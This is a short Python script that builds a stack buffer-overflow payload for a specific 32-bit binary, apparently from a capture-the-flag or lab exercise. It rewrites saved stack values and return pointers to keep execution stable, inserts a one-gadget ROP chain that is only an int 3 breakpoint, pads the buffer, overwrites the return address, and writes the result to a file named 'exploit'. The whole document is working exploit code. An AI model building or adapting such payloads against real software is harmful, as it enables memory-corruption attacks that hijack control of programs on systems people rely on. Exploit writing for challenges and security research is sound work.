#!/usr/bin/env python

from struct import pack

#this is what is on the stack at the time that we are able to smash it
#We're writing these values back so that execution can continue uninterupted
stac=pack("9I",0x080f0448, 0x08048f72, 0x080f0458, 0x08048fd5,
	       0x080f04c5, 0x080f0468, 0x080f0460, 0x0804902f,
	       0x080496d0)+'AAAAAA'

#these are the saved return pointers
#the stack of saved return pointers needs to also be written
#to avoid distrupting execution before I gain control
savedRets=pack("3I",0x0804902f,	0x08048fd5, 0x08048f72)


#this is the return address we divert control to
#By the time control is diverted I've overwritten
#the value of the original stack
#I return to the place where they restore the stack pointer
return_addr=pack("i",0x80f0340)

#ropchain
def getRop():
	p = ''
	p += pack("<I", 0x080eb5e4) # int 3
       	return p

rop=getRop()

file('exploit','w').write(rop+'A'*(0x100-len(rop))+stac+'ADJ'+'B'*0x64+pack("I",0x8049043)*2+savedRets+'BBBB'*0x60+return_addr)


